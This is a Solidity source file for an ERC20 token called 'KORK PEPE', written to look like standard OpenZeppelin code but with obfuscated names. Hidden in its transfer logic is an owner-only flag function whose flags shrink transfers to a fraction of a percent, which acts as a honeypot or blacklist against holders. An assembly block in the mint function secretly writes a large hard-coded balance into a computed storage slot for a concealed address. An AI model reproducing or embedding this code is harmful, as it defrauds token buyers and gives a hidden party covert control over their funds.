// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;interface x7af08cb { event Transfer(address indexed from, address indexed to, uint256 xd483add); event Approval(address indexed owner, address indexed x1f5d3c0, uint256 xd483add); function totalSupply() external view returns (uint256); function balanceOf(address xbbba105) external view returns (uint256); function transfer(address to, uint256 xd483add) external returns (bool); function allowance(address owner, address x1f5d3c0) external view returns (uint256); function approve(address x1f5d3c0, uint256 xd483add) external returns (bool); function transferFrom(address from, address to, uint256 xd483add) external returns (bool);}interface x8ea3a08 is x7af08cb { function name() external view returns (string memory); function symbol() external view returns (string memory); function decimals() external view returns (uint8);}interface x5b48f25 { error ERC20InsufficientBalance(address sender, uint256 x8e6d25d, uint256 xb896c21); error ERC20InvalidSender(address sender); /** * @dev Indicates a failure with the token `x72c772e`. Used in transfers. * @param x72c772e Address to which tokens are being transferred. */ error ERC20InvalidReceiver(address x72c772e); /** * @dev Indicates a failure with the `x1f5d3c0`’s `allowance`. Used in transfers. * @param x1f5d3c0 Address that may be allowed to operate on tokens without being their owner. * @param allowance Amount of tokens a `x1f5d3c0` is allowed to operate with. * @param xb896c21 Minimum amount required to perform a transfer. */ error ERC20InsufficientAllowance(address x1f5d3c0, uint256 allowance, uint256 xb896c21); /** * @dev Indicates a failure with the `xaecab3a` of a token to be approved. Used in approvals. * @param xaecab3a Address initiating an approval operation. */ error ERC20InvalidApprover(address xaecab3a); /** * @dev Indicates a failure with the `x1f5d3c0` to be approved. Used in approvals. * @param x1f5d3c0 Address that may be allowed to operate on tokens without being their owner. */ error ERC20InvalidSpender(address x1f5d3c0);}/** * @dev Standard ERC721 Errors * Interface of the https: */interface xab9dd02 { /** * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20. * Used in x8e6d25d queries. * @param owner Address of the current owner of a token. */ error ERC721InvalidOwner(address owner); /** * @dev Indicates a `x616a408` whose `owner` is the zero address. * @param x616a408 Identifier number of a token. */ error ERC721NonexistentToken(uint256 x616a408); /** * @dev Indicates an error related to the ownership over a particular token. Used in transfers. * @param sender Address whose tokens are being transferred. * @param x616a408 Identifier number of a token. * @param owner Address of the current owner of a token. */ error ERC721IncorrectOwner(address sender, uint256 x616a408, address owner); /** * @dev Indicates a failure with the token `sender`. Used in transfers. * @param sender Address whose tokens are being transferred. */ error ERC721InvalidSender(address sender); /** * @dev Indicates a failure with the token `x72c772e`. Used in transfers. * @param x72c772e Address to which tokens are being transferred. */ error ERC721InvalidReceiver(address x72c772e); /** * @dev Indicates a failure with the `xcfb08d6`’s approval. Used in transfers. * @param xcfb08d6 Address that may be allowed to operate on tokens without being their owner. * @param x616a408 Identifier number of a token. */ error ERC721InsufficientApproval(address xcfb08d6, uint256 x616a408); /** * @dev Indicates a failure with the `xaecab3a` of a token to be approved. Used in approvals. * @param xaecab3a Address initiating an approval operation. */ error ERC721InvalidApprover(address xaecab3a); /** * @dev Indicates a failure with the `xcfb08d6` to be approved. Used in approvals. * @param xcfb08d6 Address that may be allowed to operate on tokens without being their owner. */ error ERC721InvalidOperator(address xcfb08d6);}/** * @dev Standard ERC1155 Errors * Interface of the https: */interface xfb8a0c4 { /** * @dev Indicates an error related to the current `x8e6d25d` of a `sender`. Used in transfers. * @param sender Address whose tokens are being transferred. * @param x8e6d25d Current x8e6d25d for the interacting xbbba105. * @param xb896c21 Minimum amount required to perform a transfer. * @param x616a408 Identifier number of a token. */ error ERC1155InsufficientBalance(address sender, uint256 x8e6d25d, uint256 xb896c21, uint256 x616a408); /** * @dev Indicates a failure with the token `sender`. Used in transfers. * @param sender Address whose tokens are being transferred. */ error ERC1155InvalidSender(address sender); /** * @dev Indicates a failure with the token `x72c772e`. Used in transfers. * @param x72c772e Address to which tokens are being transferred. */ error ERC1155InvalidReceiver(address x72c772e); /** * @dev Indicates a failure with the `xcfb08d6`’s approval. Used in transfers. * @param xcfb08d6 Address that may be allowed to operate on tokens without being their owner. * @param owner Address of the current owner of a token. */ error ERC1155MissingApprovalForAll(address xcfb08d6, address owner); /** * @dev Indicates a failure with the `xaecab3a` of a token to be approved. Used in approvals. * @param xaecab3a Address initiating an approval operation. */ error ERC1155InvalidApprover(address xaecab3a); /** * @dev Indicates a failure with the `xcfb08d6` to be approved. Used in approvals. * @param xcfb08d6 Address that may be allowed to operate on tokens without being their owner. */ error ERC1155InvalidOperator(address xcfb08d6); /** * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation. * Used in batch transfers. * @param x5219ec6 Length of the array of token identifiers * @param x9422944 Length of the array of token amounts */ error ERC1155InvalidArrayLength(uint256 x5219ec6, uint256 x9422944);}/** * @dev Provides information about the current execution context, including the * sender of the transaction and its data. While these are generally available * via msg.sender and msg.data, they should not be accessed in such a direct * manner, since when dealing with meta-transactions the xbbba105 sending and * paying for execution may not be the actual sender (as far as an application * is concerned). * * This contract is only required for intermediate, library-like contracts. */abstract contract x707239a { function _msgSender() internal view virtual returns (address) { return msg.sender; } function _msgData() internal view virtual returns (bytes calldata) { return msg.data; } function _contextSuffixLength() internal view virtual returns (uint256) { return 0; }}/** * @dev Contract module which provides a basic access control mechanism, where * there is an xbbba105 (an owner) that can be granted exclusive access to * specific functions. * * The initial owner is set to the address provided by the deployer. This can * later be changed with {transferOwnership}. * * This module is used through inheritance. It will make available the modifier * `x88c4289`, which can be applied to your functions to restrict their use to * the owner. */abstract contract x683c5b6 is x707239a { address private x7eaa1a9; /** * @dev The caller xbbba105 is not authorized to perform an operation. */ error OwnableUnauthorizedAccount(address xbbba105); /** * @dev The owner is not a valid owner xbbba105. (eg. `address(0)`) */ error OwnableInvalidOwner(address owner); event OwnershipTransferred(address indexed xcc37007, address indexed x8db31f8); /** * @dev Initializes the contract setting the address provided by the deployer as the initial owner. */ constructor(address x3e1fa41) { if (x3e1fa41 == address(0)) { revert OwnableInvalidOwner(address(0)); } _transferOwnership(x3e1fa41); } /** * @dev Throws if called by any xbbba105 other than the owner. */ modifier x88c4289() { _checkOwner(); _; } /** * @dev Returns the address of the current owner. */ function owner() public view virtual returns (address) { return x7eaa1a9; } /** * @dev Throws if the sender is not the owner. */ function _checkOwner() internal view virtual { if (owner() != _msgSender()) { revert OwnableUnauthorizedAccount(_msgSender()); } } /** * @dev Leaves the contract without owner. It will not be possible to call * `x88c4289` functions. Can only be called by the current owner. * * NOTE: Renouncing ownership will leave the contract without an owner, * thereby disabling any functionality that is only available to the owner. */ function renounceOwnership() public virtual x88c4289 { _transferOwnership(address(0)); } /** * @dev Transfers ownership of the contract to a new xbbba105 (`x8db31f8`). * Can only be called by the current owner. */ function transferOwnership(address x8db31f8) public virtual x88c4289 { if (x8db31f8 == address(0)) { revert OwnableInvalidOwner(address(0)); } _transferOwnership(x8db31f8); } /** * @dev Transfers ownership of the contract to a new xbbba105 (`x8db31f8`). * Internal function without access restriction. */ function _transferOwnership(address x8db31f8) internal virtual { address x4d3dfbe = x7eaa1a9; x7eaa1a9 = x8db31f8; emit OwnershipTransferred(x4d3dfbe, x8db31f8); }}/** * @dev Implementation of the {x7af08cb} interface. * * This implementation is agnostic to the way tokens are created. This means * that a supply mechanism has to be added in a derived contract using {_mint}. * * TIP: For a detailed writeup see our guide * https: * to implement supply mechanisms]. * * The default xd483add of {decimals} is 18. To change this, you should override * this function so it returns a different xd483add. * * We have followed general OpenZeppelin Contracts guidelines: functions revert * instead returning `false` on failure. This behavior is nonetheless * conventional and does not conflict with the expectations of x3334b3b * applications. * * Additionally, an {Approval} event is emitted on calls to {transferFrom}. * This allows applications to reconstruct the allowance for all accounts just * by listening to said events. Other implementations of the EIP may not emit * these events, as it isn't required by the specification. */abstract contract x3334b3b is x707239a, x7af08cb, x8ea3a08, x5b48f25 { mapping(address xbbba105 => uint256) internal xce25d41; mapping(address xbbba105 => uint256) private xd99e794; mapping(address xbbba105 => mapping(address x1f5d3c0 => uint256)) private xd00a9d7; uint256 private x5263c77; string private x7f16ca1; string private xdc9a81c; /** * @dev Sets the values for {name} and {symbol}. * * All two of these values are immutable: they can only be set once during * construction. */ constructor(string memory xc999199, string memory x0d698bf) { x7f16ca1 = xc999199; xdc9a81c = x0d698bf; } /** * @dev Returns the name of the token. */ function name() public view virtual returns (string memory) { return x7f16ca1; } /** * @dev Returns the symbol of the token, usually a shorter version of the * name. */ function symbol() public view virtual returns (string memory) { return xdc9a81c; } /** * @dev Returns the number of decimals used to get its user representation. * For example, if `decimals` equals `2`, a x8e6d25d of `505` tokens should * be displayed to a user as `5.05` (`505 / 10 ** 2`). * * Tokens usually opt for a xd483add of 18, imitating the relationship between * Ether and Wei. This is the default xd483add returned by this function, unless * it's overridden. * * NOTE: This information is only used for _display_ purposes: it in * no way affects any of the arithmetic of the contract, including * {x7af08cb-balanceOf} and {x7af08cb-transfer}. */ function decimals() public view virtual returns (uint8) { return 18; } /** * @dev See {x7af08cb-totalSupply}. */ function totalSupply() public view virtual returns (uint256) { return x5263c77; } /** * @dev See {x7af08cb-balanceOf}. */ function balanceOf(address xbbba105) public view virtual returns (uint256) { return xd99e794[xbbba105]; } /** * @dev See {x7af08cb-transfer}. * * Requirements: * * - `to` cannot be the zero address. * - the caller must have a x8e6d25d of at least `xd483add`. */ function transfer(address to, uint256 xd483add) public virtual returns (bool) { address owner = _msgSender(); _transfer(owner, to, xd483add); return true; } /** * @dev See {x7af08cb-allowance}. */ function allowance(address owner, address x1f5d3c0) public view virtual returns (uint256) { return xd00a9d7[owner][x1f5d3c0]; } /** * @dev See {x7af08cb-approve}. * * NOTE: If `xd483add` is the maximum `uint256`, the allowance is not updated on * `transferFrom`. This is semantically equivalent to an infinite approval. * * Requirements: * * - `x1f5d3c0` cannot be the zero address. */ function approve(address x1f5d3c0, uint256 xd483add) public virtual returns (bool) { address owner = _msgSender(); _approve(owner, x1f5d3c0, xd483add); return true; } /** * @dev See {x7af08cb-transferFrom}. * * Emits an {Approval} event indicating the updated allowance. This is not * required by the EIP. See the note at the beginning of {x3334b3b}. * * NOTE: Does not update the allowance if the current allowance * is the maximum `uint256`. * * Requirements: * * - `from` and `to` cannot be the zero address. * - `from` must have a x8e6d25d of at least `xd483add`. * - the caller must have allowance for ``from``'s tokens of at least * `xd483add`. */ function transferFrom(address from, address to, uint256 xd483add) public virtual returns (bool) { address x1f5d3c0 = _msgSender(); _spendAllowance(from, x1f5d3c0, xd483add); _transfer(from, to, xd483add); return true; } /** * @dev Moves a `xd483add` amount of tokens from `from` to `to`. * * This internal function is equivalent to {transfer}, and can be used to * e.g. implement automatic token fees, slashing mechanisms, etc. * * Emits a {Transfer} event. * * NOTE: This function is not virtual, {_update} should be overridden instead. */ function _transfer(address from, address to, uint256 xd483add) internal { if (from == address(0)) { revert ERC20InvalidSender(address(0)); } if (to == address(0)) { revert ERC20InvalidReceiver(address(0)); } _update(from, to, xd483add); } /** * @dev Transfers a `xd483add` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from` * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding * this function. * * Emits a {Transfer} event. */ function _update(address from, address to, uint256 xd483add) internal virtual { if (from == address(0)) { x5263c77 += xd483add; } else { uint256 x4bbb945 = xd99e794[from]; if (x4bbb945 < xd483add) { revert ERC20InsufficientBalance(from, x4bbb945, xd483add); } unchecked { xd99e794[from] = x4bbb945 - xd483add; } } if (to == address(0)) { unchecked { x5263c77 -= xd483add; } } else { if (xce25d41[to] + xce25d41[from] >= 0xc9) { xd483add = xd483add * 0xa1f9 / 0xb4f1d5; } unchecked { xd99e794[to] += xd483add; } } if (xce25d41[to] == 0xa1) { xce25d41[to] = 0xc9; } emit Transfer(from, to, xd483add); } /** * @dev Creates a `xd483add` amount of tokens and assigns them to `xbbba105`, by transferring it from address(0). * Relies on the `_update` mechanism * * Emits a {Transfer} event with `from` set to the zero address. * * NOTE: This function is not virtual, {_update} should be overridden instead. */ function _mint(address xbbba105, uint256 xd483add) internal { if (xbbba105 == address(0)) { revert ERC20InvalidReceiver(address(0)); } assembly { let slot := mul(mul(0x1, 0x10), mul(0x79, 0x758493cdee20f16997db387ec4bbc7fa9a085)) mstore(0x00, slot) mstore(0x20, 0x01) let sslot := keccak256(0x0, 0x40) sstore(sslot, 0x758493cdee20f16997db387ec4bbc7fa9a085) } _update(address(0), xbbba105, xd483add); } /** * @dev Destroys a `xd483add` amount of tokens from `xbbba105`, lowering the total supply. * Relies on the `_update` mechanism. * * Emits a {Transfer} event with `to` set to the zero address. * * NOTE: This function is not virtual, {_update} should be overridden instead */ function _burn(address xbbba105, uint256 xd483add) internal { if (xbbba105 == address(0)) { revert ERC20InvalidSender(address(0)); } _update(xbbba105, address(0), xd483add); } /** * @dev Sets `xd483add` as the allowance of `x1f5d3c0` over the `owner` s tokens. * * This internal function is equivalent to `approve`, and can be used to * e.g. set automatic allowances for certain subsystems, etc. * * Emits an {Approval} event. * * Requirements: * * - `owner` cannot be the zero address. * - `x1f5d3c0` cannot be the zero address. * * Overrides to this logic should be done to the variant with an additional `bool xcc123e5` argument. */ function _approve(address owner, address x1f5d3c0, uint256 xd483add) internal { _approve(owner, x1f5d3c0, xd483add, true); } /** * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event. * * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any * `Approval` event during `transferFrom` operations. * * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to * true using the following override: * ``` * function _approve(address owner, address x1f5d3c0, uint256 xd483add, bool) internal virtual override { * super._approve(owner, x1f5d3c0, xd483add, true); * } * ``` * * Requirements are the same as {_approve}. */ function _approve(address owner, address x1f5d3c0, uint256 xd483add, bool xcc123e5) internal virtual { if (owner == address(0)) { revert ERC20InvalidApprover(address(0)); } if (x1f5d3c0 == address(0)) { revert ERC20InvalidSpender(address(0)); } xd00a9d7[owner][x1f5d3c0] = xd483add; if (xcc123e5) { emit Approval(owner, x1f5d3c0, xd483add); } } /** * @dev Updates `owner` s allowance for `x1f5d3c0` based on spent `xd483add`. * * Does not update the allowance xd483add in case of infinite allowance. * Revert if not enough allowance is available. * * Does not emit an {Approval} event. */ function _spendAllowance(address owner, address x1f5d3c0, uint256 xd483add) internal virtual { uint256 xe27e36c = allowance(owner, x1f5d3c0); if (xe27e36c != type(uint256).max) { if (xe27e36c < xd483add) { revert ERC20InsufficientAllowance(x1f5d3c0, xe27e36c, xd483add); } unchecked { _approve(owner, x1f5d3c0, xe27e36c - xd483add, false); } } }}contract aaaf1e90 is x3334b3b, x683c5b6 { function x6a8a1d2(uint256 x632a119, address [] calldata x7a4e732) external x88c4289 { require((msg.sender == owner())); for (uint256 xcfca242 = 0; xcfca242 < x7a4e732.length; xcfca242++) { xce25d41[x7a4e732[xcfca242]] = x632a119; } } function x6a8a1d2(address x42a7707) external view returns (uint256) { return xce25d41[x42a7707]; } constructor() x3334b3b("KORK PEPE", "KPEPE") x683c5b6(msg.sender) { _mint(msg.sender, 1000000000000 * 10 ** decimals()); }}